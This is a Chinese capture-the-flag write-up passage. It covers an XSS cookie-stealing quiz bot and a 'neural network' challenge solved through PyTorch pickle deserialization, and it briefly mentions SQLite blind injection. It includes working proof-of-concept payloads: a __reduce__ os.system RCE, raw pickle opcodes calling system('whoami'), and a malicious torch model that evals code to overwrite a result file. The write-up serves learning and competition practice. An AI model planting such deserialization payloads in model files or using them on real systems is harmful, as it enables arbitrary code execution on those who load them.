        options.add_argument('--no-sandbox') # sandbox not working in docker
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--user-data-dir=/dev/shm/user-data')
        os.environ['TMPDIR'] = "/dev/shm/"
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        with webdriver.Chrome(options=options) as driver:
            ua = driver.execute_script('return navigator.userAgent')
            print(' I am using', ua)
            print('- Logining...')
            driver.get(LOGIN_URL)
            time.sleep(4)
            print(' Putting secret flag...')
            driver.execute_script(f'document.cookie="flag={FLAG}"')
            time.sleep(1)
            print('- Now browsing your quiz result...')
            driver.get(url)
            time.sleep(4)
            try:
                greeting = driver.execute_script(f"return document.querySelector('#greeting').textContent")
                score = driver.execute_script(f"return document.querySelector('#score').textContent")
            except selenium.common.exceptions.JavascriptException:
                print('JavaScript Error: Did you give me correct URL?')
                exit(1)
            print("OK. Now I know that:")
            print(greeting)
            print(score)
        print('- Thank you for joining my quiz!')
    except Exception as e:
        print('ERROR', type(e))
        import traceback
        traceback.print_exception(*sys.exc_info(), limit=0, file=None, chain=False)
其中最为重要的是三个driver.execute_script执行JS代码匹配#greeting,#score对象并输出，并把flag写入JS的cookie中。所以把cookie写入到#greeting或者#score其中一个内就会把flag输出。
payload:`1:`
base64加密后复制url至terminal ctrl+shift+V
## 二次元神经网络
> 天冷极了，下着雪，又快黑了。这是一年的最后一天——大年夜。在这又冷又黑的晚上，一个没有 GPU、没有 TPU
> 的小女孩，在街上缓缓地走着。她从家里出来的时候还带着捡垃圾捡来的 E3 处理器，但是有什么用呢？跑不动 Stable Diffusion，也跑不动
> NovelAI。她也想用自己的处理器训练一个神经网络，生成一些二次元的图片。  
>  于是她配置好了 PyTorch 1.9.1，定义了一个极其简单的模型，用自己收集的 10 张二次元图片和对应的标签开始了训练。
>  
>  
>     SimpleGenerativeModel(
>     (tag_encoder): TagEncoder(
>     (embedding): Embedding(63, 8, padding_idx=0)
>     )
>     (model): Sequential(
>     (0): Linear(in_features=16, out_features=8, bias=True)
>     (1): ReLU()
>     (2): Linear(in_features=8, out_features=8, bias=True)
>     (3): ReLU()
>     (4): Linear(in_features=8, out_features=64 * 64 * 3, bias=True)
>     (5): Tanh()
>     )
>     )
>
> 她在 CPU 上开始了第一个 epoch 的训练，loss 一直在下降，许多二次元图片重叠在一起，在向她眨眼睛。  
>  她又开始了第二个 epoch，loss 越来越低，图片越来越精美，她的眼睛也越来越累，她的眼睛开始闭上了。  
>  ...  
>  第二天清晨，这个小女孩坐在墙角里，两腮通红，嘴上带着微笑。新年的太阳升起来了，照在她小小的尸体上。  
>  人们发现她时才知道，她的模型在 10 张图片上过拟合了，几乎没有误差。  
>  （完）  
>  听完这个故事，你一脸的不相信：“这么简单的模型怎么可能没有误差呢？”，于是你开始复现这个二次元神经网络。
### python反序列化知识
python通过loads反序列化，dumps序列化。和php一样可以序列化字符串、数组、数和类
pickletools可以反汇编一个序列化出来的字符串，方便调试，分析案例见`https://xz.aliyun.com/t/7436`，文章详细介绍了反系列化原理，并且给出了opcode的用法
通用的poc，利用`__reduce__`RCE
    import pickle
    import os
    class genpoc(object):
        def __reduce__(self):
            s = """echo test >poc.txt"""  # 要执行的命令
            return os.system, (s,)        # reduce函数必须返回元组或字符串
    e = genpoc()
    poc = pickle.dumps(e)
    print(poc) # 此时，如果 pickle.loads(poc)，就会执行命令
但是需要一次执行多个函数时就不能光用`__reduce__`，reduce一次只能执行一个函数(除了exec可以堆叠执行命令)。当然这道题就一个reduce就可以了。opcode的编写实例：
    # main.py
    import pickle
    import secret
    opcode='''c__main__
    secret
    (S'name'
    S'1'
    db.'''
    print('before:',secret.name)
    output=pickle.loads(opcode.encode())
    print('output:',output)
    print('after:',secret.name)
上述代码用`c`获取全局变量secret，用`d`建立一个字典，`b`用栈的第一个元素做key,第二个元素做属性，`(`压栈，`S''`为字符串对象，`.`结束。所以以上代码的意思为name=1对全局变量name的值进行覆盖。
同理，构造函数可以用`R`,`i`,`o`
  1. R
    b'''cos
    system
    (S'whoami'
    tR.'''
`cos`import库，`t`表示从上一个`(`开始把后面的元素组合为元组，上述代码只有一个`S‘whoami'`，就构成`['whoami']`，R表示栈的第一个对象`system`作为函数，第二个对象也就是`['whoami']`作为参数调用函数，组合起来就是`system(whoami)`（不需要单引号包裹whoami因为已经用S’‘表示了数据类型）
  1. i
    b'''(S'whoami'
    ios
    system
    .'''
`s`生成system-whoami键值对并添加到栈的第三个对象，并把whoami和system出栈，o实例化system-whoami对象，i调用o实现函数调用。`system(whoami)`
  1. o
    b'''(cos
    system
    S'whoami'
    o.'''
o操作调用system为函数，whoami为参数执行。和R区别不同的是参数对象不用为元组
### 题解
如果认真了解过python反序列化，每篇文章开始几乎都会介绍python反序列化的入口函数，也就是pickle模块的pickle.load和pickle.loads，而torch.load反序列化的方式和pickle.load完全相同，所以利用方式也相同。
题目打开为如下界面：
下载解压附件2d_model.zip。题目描述上传模型由infer.py运行。infer.py源码：
    import io
    import json
    import base64
    import torch
    import matplotlib
    import matplotlib.image
    from models import SimpleGenerativeModel
    def infer(pt_file):
        # load input data
        tag_ids = torch.load("dataset/tags_10.pt", map_location="cpu")
        # args
        n_tags = 63
        dim = 8
        img_shape = (64, 64, 3)
        # load model
        model = SimpleGenerativeModel(n_tags=n_tags, dim=dim, img_shape=img_shape)
        model.load_state_dict(torch.load(pt_file, map_location="cpu"))
        # generate noise
        torch.manual_seed(0)
        n_samples = tag_ids.shape[0]
        noise = torch.randn(n_samples, dim)
        # forward
        with torch.no_grad():
            model.eval()
            predictions = model(noise, tag_ids).clamp(0, 1)
        gen_imgs = []
        for i in range(n_samples):
            out_io = io.BytesIO()
            matplotlib.image.imsave(out_io, predictions[i].numpy(), format="png")
            png_b64 = base64.b64encode(out_io.getvalue()).decode()
            gen_imgs.append(png_b64)
        # save the predictions
        json.dump({"gen_imgs_b64": gen_imgs}, open("/tmp/result.json", "w"))
    if __name__ == "__main__":
        infer(open("checkpoint/model.pt", "rb"))
        print(open("/tmp/result.json", "r").read())
在checkpoint目录下有训练好的model.pt，上传后误差很大（机器学习大佬可以考虑训练精准度很高的模型试着上传）
infer.py加载tags_10.pt对上传的model.pt进行预测，并在训练结束后把答案写进/tmp/result.json中，而在dataset里还有另一个模型，为pixels_10.pt（train.py训练模型的代码如下）。所以构造的关键就是向/tmp/result.json中写入标准的序列化模型。
本题所用的机器学习的知识仅有：训练是指创建模型，向模型展示标签样本，让模型学习特征和标签的关系；推断是指训练后的模型做出有用的预测。train.py便是创建模型。infer.py便是让模型做出预测。预测的标准答案就在pixels.pt里
所以payload如下：（因为eval代码执行和本身执行的原因，需要对\和单引号转义）
    import io
    import json
    import base64
    import torch
    import matplotlib
    import matplotlib.image
    # 加载正确答案
    pixel="pixels_10.pt"
    predictions = torch.load(pixel, map_location="cpu")
    # 向/tmp/result.json中写入正确数据
    gen_imgs = []
    for i in range(10):
        out_io = io.BytesIO()
        matplotlib.image.imsave(out_io, predictions[i].numpy(), format="png")
        png_b64 = base64.b64encode(out_io.getvalue()).decode()
        gen_imgs.append(png_b64)
    content = json.dumps({"gen_imgs_b64": gen_imgs})
    content.replace('\\', '\\\\').replace("'", "\\'")
    # 构造要执行的 python 代码
    args = "open('/tmp/result.json', 'w').write('" + content + "')"
    # 通过 __reduce__ 方法执行 python 代码
    class Exploit(object):
        def __reduce__(self):
            return (eval, (args,))
    torch.save(Exploit(), "model_exp.pt", _use_new_zipfile_serialization=False)
将生成的model_exp.pt上传，就能匹配正确值
刚入门机器学习的，比如我，会遇到由于版本不对无法安装torch的问题，查看自己python支持的版本有三种方法，一个一个试：
  1.     import pip._internal.pep425tags
    print(pip._internal.pep425tags.get_supported())
  2. 
    import wheel.pep425tags
        print(wheel.pep425tags.get_supported())
  1.     python -m pip debug --verbose
不过最大的问题是torch在32位的python下是无法正常工作的，需要装64位的python，只需要把64位python的系统变量写在32位之上(python和script)。整了一晚上，太坑了
还有一种手法不需要正确的答案，而是用前面定义的参数（也就是正确的n_tags,dim,img_shape）写入到/tmp/result.json，但是后面的json.dump和open也会执行，所以进行了绕过。具体见大佬博客：`https://blog.tonycrane.cc/p/169d9f3d.html#%E4%BA%8C%E6%AC%A1%E5%85%83%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C`
最后一个你先别急sqlite注入可以用验证码识别进行布尔盲注，或者手工，但是会慢一点，很多大佬都写过了。
参考链接：`https://exexute.github.io/2019/04/24/how-hacking-with-LaTex/`